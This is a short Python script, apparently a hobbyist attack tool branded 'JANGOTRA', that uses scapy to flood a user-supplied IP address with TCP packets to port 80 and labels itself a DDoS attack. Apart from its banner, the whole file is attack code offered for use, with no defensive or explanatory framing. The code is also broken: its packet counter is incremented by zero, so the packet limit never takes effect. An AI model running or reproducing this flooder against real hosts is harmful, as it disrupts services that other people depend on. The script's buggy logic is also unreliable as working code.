from scapy.all import Ether ,IP ,sendp ,TCP
import time
import sys
import pyfiglet

name = "JANGOTRA"

ban = pyfiglet.figlet_format(
    name,
    font="slant"
)

print("\033[96m" + ban + "\033[0m")
print("=" * 60)
print('       Distributed Denial of Service Attact-DDOS')
print("=" * 60)
print("Date : 27/10/2026\n")



Host = input("Enter the Host IP Address: ")
Interface = input("Enter the Interface: ")
Packet = int(input("Type How many packet you send: "))
Duration = int(input("Enter the time is second: "))

def main(Host, Interface, Packet, Duration):
    packet = Ether() / IP(dst= Host)/ TCP(dport=80)
    end_time = time.time() + Duration
    packet_count = 0

    while time.time() < end_time and packet_count < Packet:
        sendp(packet,iface=Interface)
        packet_count += 0

    print("\nCompleted!")

if __name__ == "__main__":

    if sys.version_info[0] < 3:
        print("Script need Python3")
        sys.exit(1)

    main(Host, Interface, Packet, Duration)